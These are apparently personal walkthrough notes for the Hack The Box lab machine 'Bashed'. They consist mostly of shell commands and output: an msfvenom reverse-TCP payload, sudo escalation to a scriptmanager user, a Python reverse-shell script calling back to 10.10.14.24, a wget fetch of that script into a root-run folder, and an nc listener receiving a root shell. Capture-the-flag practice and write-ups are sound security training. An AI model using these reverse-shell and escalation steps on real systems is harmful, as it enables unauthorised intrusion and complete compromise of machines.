# Bashed

## where you at 

10.10.10.68

## what you got

/dev = php shell

``` 
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f elf > notmalware.elf
```

```
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

```
sudo -u scriptmanager /bin/bash -i
scriptmanager@bashed:/tmp$ ls -la /
ls -la /
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
....
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jan 24 15:40 scripts
....

scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jan 24 15:40 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager  213 Jan 24 15:39 test.py
-rw-r--r--  1 root          root            12 Jan 24 15:30 test.txt
```

```
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/bashed/web# cat test.py 
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.24",4455))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/bashed/web# vim test.py 
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/bashed/web# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.68 - - [25/Jan/2020 00:39:59] "GET /test.py HTTP/1.1" 200 -
```

```
scriptmanager@bashed:/scripts$ wget http://10.10.14.24/test.py
wget http://10.10.14.24/test.py
--2020-01-24 15:39:19--  http://10.10.14.24/test.py
Connecting to 10.10.14.24:80... connected.
HTTP request sent, awaiting response... 200 OK
```

```
root@kali:~# nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.68] 57362
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```